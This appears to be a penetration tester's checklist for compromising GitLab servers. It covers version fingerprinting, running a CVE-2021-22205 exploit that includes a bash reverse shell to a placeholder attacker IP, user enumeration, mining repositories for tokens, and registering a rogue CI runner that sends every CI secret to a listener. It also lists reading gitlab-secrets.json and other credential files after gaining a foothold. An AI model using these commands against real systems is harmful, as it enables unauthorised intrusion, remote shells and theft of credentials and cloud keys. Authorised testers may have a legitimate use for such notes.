# GitLab

## Before I start
- [ ] Version first: curl -s http://target/users/sign_in | grep -oP 'content="[0-9.]+"'
- [ ] 11.9 ≤ v < 13.8.8 / 13.9.6 / 13.10.3 → CVE-2021-22205 unauth RCE, skip everything else

## CVE-2021-22205 (ExifTool DjVu)
searchsploit gitlab 13
python3 CVE-2021-22205.py -t http://target -c 'id'
python3 CVE-2021-22205.py -t http://target -c 'bash -c "bash -i >& /dev/tcp/<AttackerIP>/443 0>&1"'
- [ ] Pre-auth, runs as git user — one of the few version-match = shell CVEs

## No CVE path
- [ ] Registration open → account → internal-visibility projects readable
- [ ] User enum: /api/v4/users?username=root
- [ ] Mine projects/snippets/wikis: .env, glpat- tokens, Terraform state with cloud keys
- [ ] Pipeline logs print "masked" CI variables surprisingly often

## Rogue runner
gitlab-runner register --url http://target --token <RegToken> --executor docker
- [ ] Push a job that exfils env: every CI secret (AWS, kubeconfig, deploy passwords) → my listener

## Post-foothold loot (as git)
cat /etc/gitlab/gitlab.rb
cat /etc/gitlab/gitlab-secrets.json
- [ ] DB creds, LDAP bind password, secret_key_base, CI variable encryption keys
- [ ] gitlabhq_production: bcrypt users, tokens, runner tokens

## Next
- [ ] Cloud keys → AWS/cloud enum (note: Attacking AWS page)
- [ ] LDAP bind creds → :Pb spraying / :Pb domain-enum
